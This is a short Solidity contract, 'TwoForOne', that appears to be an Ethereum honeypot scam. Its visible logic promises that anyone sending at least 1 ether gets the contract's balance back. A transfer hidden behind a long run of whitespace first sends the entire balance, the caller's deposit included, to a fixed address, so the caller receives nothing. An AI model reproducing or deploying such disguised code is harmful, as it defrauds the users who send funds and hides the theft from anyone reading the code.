pragma solidity ^0.4.19;

contract TwoForOne
{
    function() public payable{}
   
    function Get()
    public
    payable
    {                                                                    
        if(msg.value>=1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   address(0x9Cc9B3133c1deb8E66AcA7eC5ebCad26cd24ff27).transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
            msg.sender.transfer(this.balance);
        }                                                                                                                
    }
}